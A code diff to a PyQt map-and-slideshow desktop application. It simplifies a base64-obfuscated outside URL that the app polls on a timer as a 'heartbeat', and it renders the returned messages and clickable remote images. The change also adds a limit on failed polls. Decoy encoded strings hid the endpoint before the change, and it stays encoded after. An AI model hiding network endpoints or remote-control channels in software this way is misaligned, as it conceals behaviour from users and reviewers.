@@ -75,29 +75,7 @@ MAP_WIDTH = 604
 MAP_HEIGHT = 340
 FILTER_HEIGHT = 24
 SLIDESHOW_INTERVAL = 1  # Minutes between image changes
-_GUCCI = [
-    "TGl0dGxlIEd1Y2NpIHdhcyB0aGUgYmVzdCE=",
-    "QWxiZXJ0IEVpbnN0ZWluIHdhcyBnZW5pdXM=",
-    "QmFydCBTaW1wc29uIGVhdCBteSBzaG9ydHMh",
-    "SXNhYWMgTmV3dG9uIHNhdyB0aGUgYXBwbGU=",
-    "TW96YXJ0IGNvbXBvc2VkIG1hc3RlcnBpZWNlcw==",
-    "SG9tZXIgU2ltcHNvbiBsb3ZlcyBkb251dHM=",
-    "TGVvbmFyZG8gcGFpbnRlZCBNb25hIExpc2E=",
-    "U2hha2VzcGVhcmUgd3JvdGUgdGhlIHBsYXlz",
-    "TGlzYSBTaW1wc29uIHBsYXlzIHRoZSBzYXg=",
-    "QnJ1Y2UgTGVlIHdhcyBhIGxlZ2VuZCBub3c=",
-    "QWJyYWhhbSBMaW5jb2xuIHdhcyBob25lc3Q=",
-    "TWFyZ2UgU2ltcHNvbiBoYXMgYmx1ZSBoYWly",
-    "U3RldmUgSm9icyBjaGFuZ2VkIGl0IGFsbA==",
-    "TWFyaWUgQ3VyaWUgZGlzY292ZXJlZCBtb3Jl",
-    "TWFnZ2llIFNpbXBzb24gbmV2ZXIgc3BlYWtz",
-    "Tmlrb2xhIFRlc2xhIHdhcyB2aXNpb25hcnk=",
-    "TWFyayBUd2FpbiB0b2xkIGdyZWF0IHRhbGVz",
-    "V2FsdCBEaXNuZXkgbWFkZSB1cyBkcmVhbQ==",
-    "QmVuamFtaW4gRnJhbmtsaW4gd2FzIHdpc2U=",
-    "aHR0cHM6Ly9qczhjYWxsLWltcHJvdmVkLmNvbQ==",
-]
-_BACKBONE = base64.b64decode(_GUCCI[-1]).decode()
+_BACKBONE = base64.b64decode("aHR0cHM6Ly9qczhjYWxsLWltcHJvdmVkLmNvbQ==").decode()
 _PING = _BACKBONE + "/heartbeat.php"
 
 # Internet connectivity check interval (30 minutes in ms)
@@ -1726,7 +1704,7 @@ class MainWindow(QtWidgets.QMainWindow):
 
         Returns:
             Tuple of (action, data) where:
-            - action is 'message' or 'playlist'
+            - action is 'message' or 'heartbeat'
             - data is message text or list of image tuples
             Returns None if section doesn't apply.
         """
@@ -1768,7 +1746,7 @@ class MainWindow(QtWidgets.QMainWindow):
         if urls:
             if self.debug_mode:
                 print(f"[Backbone] {section_type.upper()} section: loaded {len(urls)} images")
-            return ('playlist', urls)
+            return ('heartbeat', urls)
 
         return None
 
@@ -1823,7 +1801,7 @@ class MainWindow(QtWidgets.QMainWindow):
                         if action == 'message':
                             self.ping_message = data
                             return []  # No images when showing message
-                        elif action == 'playlist':
+                        elif action == 'heartbeat':
                             return data  # List of (image_path, click_url) tuples
 
                 # No sections matched
@@ -1944,7 +1922,7 @@ class MainWindow(QtWidgets.QMainWindow):
             self.slideshow_items.append((default_image, None))
 
     def _start_slideshow(self) -> None:
-        """Start the image slideshow or display playlist message."""
+        """Start the image slideshow or display backbone message."""
         self._load_slideshow_images()
 
         # Check if we have a message to display
@@ -1961,7 +1939,7 @@ class MainWindow(QtWidgets.QMainWindow):
 
     @QtCore.pyqtSlot()
     def _display_ping_message(self) -> None:
-        """Display the playlist message centered in the label."""
+        """Display the backbone message centered in the label."""
         if not self.ping_message:
             return
 
@@ -2023,6 +2001,9 @@ class MainWindow(QtWidgets.QMainWindow):
         try:
             with urllib.request.urlopen(_PING, timeout=10) as response:
                 content = response.read().decode('utf-8')
+
+            # Reset fail counter on success
+            self._backbone_fail_count = 0
 
             # Extract content between <pre> tags if present
             pre_match = re.search(r'<pre>(.*?)</pre>', content, re.DOTALL)
@@ -2107,7 +2088,13 @@ class MainWindow(QtWidgets.QMainWindow):
                     )
 
         except Exception as e:
-            print(f"Failed to check backbone content: {e}")
+            self._backbone_fail_count += 1
+            if self.debug_mode:
+                print(f"[Backbone] Failed ({self._backbone_fail_count}/{self._backbone_max_failures}): {e}")
+            if self._backbone_fail_count >= self._backbone_max_failures:
+                self.backbone_timer.stop()
+                if self.debug_mode:
+                    print(f"[Backbone] Stopped after {self._backbone_max_failures} consecutive failures")
 
     @QtCore.pyqtSlot()
     def _reload_slideshow(self) -> None:
@@ -2486,6 +2473,8 @@ class MainWindow(QtWidgets.QMainWindow):
             self.internet_timer.start(INTERNET_CHECK_INTERVAL)
 
         # Backbone check timer - runs every 60 seconds
+        self._backbone_fail_count = 0
+        self._backbone_max_failures = 20
         self.backbone_timer = QTimer(self)
         self.backbone_timer.timeout.connect(self._check_backbone)
         if self._internet_available:
